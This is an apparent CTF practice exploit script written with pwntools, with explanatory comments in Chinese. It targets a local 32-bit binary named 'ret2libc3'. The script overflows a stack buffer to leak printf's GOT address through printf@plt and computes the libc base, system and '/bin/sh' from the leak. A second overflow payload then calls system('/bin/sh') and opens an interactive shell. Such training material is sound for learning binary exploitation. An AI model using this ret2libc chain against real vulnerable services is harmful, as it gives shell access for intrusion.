from pwn import *
from LibcSearcher import *

context.log_level = 'debug' #可在屏幕上打印debug信息
context.terminal = ['tmux', 'splitw', '-h'] #告诉pwntools你的终端信息，方便后期动态调试

elf = ELF("./ret2libc3")
elf_libc = ELF("./libc.so.6")
sh = process("./ret2libc3")

# gdb.attach(sh)

sh.recv()
# 得到printf函数的got的地址，这个地址里的数据即函数的真实地址
printf_got = elf.got['printf'] 
printf_plt = elf.plt['printf']
# 跳转回程序开始, 重新执行程序
main_plt_addr = elf.symbols['_start']

print("printf_got {got_addr}".format(got_addr = printf_got))

payload1 = flat(b'a' * 0x70, printf_plt, main_plt_addr, printf_got)
# 先得到printf函数的got地址，然后把这个地址作为参数传给printf函数，然后就会把这个地址里面的数据输出出来，这个地址里面的数据就是printf函数的真实地址

sh.sendline(payload1)
printf_addr = u32(sh.recv()[0:4])
# 交互时接受返回的在libc中的真实地址，由于是32位的文件，recv(4)是指只接收四个字节的信息，因为泄露的地址信息只存在于前四个字节，u32是指解包unpack，将一块数据解包成四个字节

base_addr = printf_addr - elf_libc.symbols['printf']
system_addr = base_addr + elf_libc.symbols['system']
binsh_addr = base_addr + next(elf_libc.search(b'/bin/sh'))

print("base {base}".format(base = base_addr))
print("system {system}".format(system = system_addr))
print("binsh {binsh}".format(binsh = binsh_addr))

payload2 = flat(b'a' * 112, system_addr, b'b'*4, binsh_addr)

sh.sendline(payload2)
sh.interactive()




